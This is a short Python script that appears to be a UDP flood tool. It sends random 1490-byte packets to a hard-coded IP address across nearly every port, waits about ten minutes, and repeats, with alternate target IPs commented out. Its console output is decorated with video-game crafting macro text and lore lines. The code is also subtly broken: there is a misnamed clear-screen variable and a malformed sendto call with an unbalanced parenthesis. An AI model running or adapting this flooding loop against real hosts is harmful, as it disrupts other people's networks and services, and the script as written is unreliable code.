
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime



# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# Starting working.
os.system(cmd_clear)
print('\033[1;34mTo all of my children in whom Life flows abundant...')
time.sleep(1)
print('\033[1;34mTo all of my children to whom Death hath passed his judgement...')
time.sleep(1)
print('\033[1;34mThe soul yearns for honor, and the flesh the hereafter...')
time.sleep(1)
print('\033[1;34mLook to those who walked before to lead those who walk after...')
time.sleep(1)
print('')
time.sleep(1)
print('\033[1;34mHear...Feel...Think...')
time.sleep(2)
print('\033[0m-----------------------------------')
time.sleep(1)
print('\033[1;36m/ac Reflect <wait.3>')
time.sleep(1)
print('\033[1;36m/ac Manipulation <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Preparatory Touch <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Great Strides <wait.2>')
time.sleep(1)
print("\033[1;36m/ac Byregot's Blessing <wait.3>")
time.sleep(1)
print('\033[1;36m/ac Great Veneration <wait.2>')
time.sleep(1)
print('\033[1;36m/ac Groundwork <wait.1>')
time.sleep(1)
print('\033[1;36m/ac Groundwork')
time.sleep(1)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 1

#ip = (str("103.215.51.90")
#ip = (str("103.215.51.91")
#ip = (str("103.215.51.92")
#ip = (str("103.215.51.93")
ip = (str("163.197.32.26")

sent = 0
i = 590
timeR = i + random.randint(0,20)
now = datetime.datetime.now()
dtime = now.strftime("%Y-%m-%d %H:%M:%S")

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, ip, sent, port))
                print('\033[1;36m/wait %s'%(timeR))
                port = 1
                time.sleep(timeR)
                

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, ip, port))
            sent += 1
            port += 1
            timeR = i + random.randint(0,20)
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            # print('\033[32;1m[%s]Sented %s packets to IPs port:%s\033[0m'%(dtime, sent, port))
            
            
    except:
        print('\n\033[31;1mExited\033[0m')

